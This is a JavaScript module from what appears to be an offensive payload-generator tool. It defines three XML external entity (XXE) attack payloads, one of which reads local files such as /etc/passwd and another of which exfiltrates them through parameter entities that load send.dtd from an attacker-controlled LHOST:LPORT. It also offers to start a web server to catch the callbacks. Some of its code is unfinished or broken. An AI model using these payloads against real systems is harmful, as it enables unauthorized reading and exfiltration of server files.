var log = require('cli-color'),
	options = log.yellow,
	yellow = log.yellow,
	blue = log.cyan,
	black = log.blackBright,
	green = log.green,
	red = log.red,
	M = require('mstring'),
	ask = require('../modules/questionUser'),
	web = require("../modules/webserver/webserver.js");

// Payload Array
arrayWeb = [];

var Load = function(obj){
	arrayWeb.push(obj);
}

/* 
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis
	
	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>	 


*/
// ########## XXE Attacks

    // var test = function () {
    //     var x = 'works';
    //     return {
    //         testme: x
    //     }
    // }

    // var test2 = test();


var questions = [];
var question = function(val){
	questions.push(val);
}


Load({
	title: "Remote DTD File Parsing",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
	category: "XML",
	callback: function(returnToPrepare){
		var answer1 = question.ask("Should I fire up a web server for you? (Y/n)", returnToPrepare, "web")
	}
})


Load({
	title: "XXE (Local File Read)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]]>&bar;",
	category: "XML",
	callback: function(bro){

	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)")
	  question("Question 2")
	  question(ask.http)
	  
	  ask.some(questions, bro)			
		
	}
})


Load({
	title: "XXE (Local File Exfiltration using parameter entities)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send.dtd\">%dtd;%send; ]]>",
	category: "XML",
	callback: function(returnToPrepare){
		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
	}
})



var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayWeb,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayWeb.length;i++){
			if (arrayWeb[i].category === value){
				tempArray.push(arrayWeb[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayWeb.length;i++){
			if(unique[arrayWeb[i].category]){

			}
			else {
				unique[arrayWeb[i].category] = true;
				uniqueCategories.push(arrayWeb[i].category)
			} 
		return uniqueCategories
		}
	}
}